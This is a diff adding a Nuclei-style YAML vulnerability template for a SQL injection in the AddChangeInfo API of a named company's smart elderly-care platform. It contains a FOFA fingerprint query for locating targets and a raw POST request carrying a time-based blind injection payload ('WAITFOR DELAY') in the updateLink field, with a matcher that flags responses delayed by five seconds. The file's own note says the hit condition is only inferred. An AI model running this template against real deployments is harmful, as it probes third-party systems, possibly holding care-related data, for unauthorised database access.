@@ -1,0 +1,22 @@
+id: poc-wrx10r7m3d1g8s7x
+info:
+  name: 广西金中软件集团有限公司智慧医养服务平台AddChangeInfo存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wrx10r7m3d1g8s7x
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wrx10r7m3d1g8s7x
+    fofa: body="Content/css/Login/images/gtx-main-bg00004.png" || body="KingonUI.CommItemInfo()"
+http:
+- raw:
+  - "POST /DevApi/AddChangeInfo HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15\n\n{\n    \"updateType\": \"someType\",\n    \"updateData\": [],\n    \"productName\": \"test\",\n    \"moduleName\": \"test\",\n    \"updateLink\": \"1';WAITFOR DELAY '0:0:5'--\",\n    \"taskMsg\": \"test\"\n}"
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
